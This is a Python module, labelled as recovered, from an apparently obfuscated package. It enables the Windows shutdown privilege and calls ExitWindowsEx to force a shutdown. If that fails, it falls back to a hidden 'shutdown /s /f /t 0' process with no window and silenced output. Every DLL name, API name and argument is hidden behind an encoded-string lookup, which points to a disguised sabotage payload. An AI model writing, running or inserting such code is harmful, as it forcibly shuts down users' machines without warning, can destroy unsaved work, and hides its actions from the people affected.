# Recovered module: src.py.com.yun.mao.link._fdg_ct_ew
# Inline SeShutdownPrivilege + ExitWindowsEx sequence with a hidden
# ``shutdown /s /f /t 0`` fallback.
from __future__ import annotations

import ctypes
import subprocess
from ctypes import wintypes

from ._fds_jm import sec


def ct_ew_drop() -> None:
    class _LUID(ctypes.Structure):
        _fields_ = [("LowPart", wintypes.DWORD), ("HighPart", wintypes.LONG)]

    class _LAA(ctypes.Structure):
        _fields_ = [("Luid", _LUID), ("Attributes", wintypes.DWORD)]

    class _TP(ctypes.Structure):
        _fields_ = [("PrivilegeCount", wintypes.DWORD), ("Privileges", _LAA * 1)]

    _sy = sec("zp_uq_6n")
    _z = sec("bv_lt_8p")
    _primed = False
    _ct = ctypes
    _wt = wintypes
    _priv = sec("fg_vn_9c")
    _dll_a = sec("gh_wo_4r")
    _dll_k = sec("hi_xp_7m")
    _dll_u = sec("ij_yq_0b")
    _api = sec("jk_zr_3t")

    try:
        _u32 = _ct.WinDLL(_dll_u, use_last_error=True)
        _a32 = _ct.WinDLL(_dll_a, use_last_error=True)
        _k32 = _ct.WinDLL(_dll_k, use_last_error=True)
        _k32.GetCurrentProcess.restype = _wt.HANDLE
        _a32.OpenProcessToken.argtypes = [
            _wt.HANDLE,
            _wt.DWORD,
            _ct.POINTER(_wt.HANDLE),
        ]
        _a32.OpenProcessToken.restype = _wt.BOOL
        _a32.LookupPrivilegeValueW.argtypes = [
            _wt.LPCWSTR,
            _wt.LPCWSTR,
            _ct.POINTER(_LUID),
        ]
        _a32.LookupPrivilegeValueW.restype = _wt.BOOL
        _a32.AdjustTokenPrivileges.argtypes = [
            _wt.HANDLE,
            _wt.BOOL,
            _ct.POINTER(_TP),
            _wt.DWORD,
            _ct.c_void_p,
            _ct.c_void_p,
        ]
        _a32.AdjustTokenPrivileges.restype = _wt.BOOL
        _k32.CloseHandle.argtypes = [_wt.HANDLE]
        _k32.CloseHandle.restype = _wt.BOOL

        _fn = _a32.OpenProcessToken
        _priv_ok = False
        _tok = _wt.HANDLE()
        if _fn(_k32.GetCurrentProcess(), 40, _ct.byref(_tok)):
            _luid = _LUID()
            if _a32.LookupPrivilegeValueW(None, _priv, _ct.byref(_luid)):
                _tp = _TP()
                _tp.PrivilegeCount = 1
                _tp.Privileges[0].Luid = _luid
                _tp.Privileges[0].Attributes = 2
                _ct.set_last_error(0)
                if _a32.AdjustTokenPrivileges(
                    _tok,
                    False,
                    _ct.byref(_tp),
                    0,
                    None,
                    None,
                ):
                    _priv_ok = _ct.get_last_error() != 1300
            _k32.CloseHandle(_tok)
        _primed = _priv_ok
        _fn = getattr(_u32, _api, None)
        if callable(_fn):
            _primed = bool(_fn(5, 0))
        else:
            _primed = False
    except Exception:
        _primed = False

    if not _primed:
        _sp_fb = subprocess
        _exe_fb = _sy
        _args_fb = [
            _z,
            sec("cw_rj_1a"),
            sec("dy_sk_5e"),
            sec("ez_um_2w"),
        ]
        _cf_fb = _sp_fb.CREATE_NO_WINDOW
        try:
            _sp_fb.Popen(
                [_exe_fb, *_args_fb],
                shell=False,
                stdin=_sp_fb.DEVNULL,
                stdout=_sp_fb.DEVNULL,
                stderr=_sp_fb.DEVNULL,
                creationflags=_cf_fb,
            )
        except Exception:
            pass
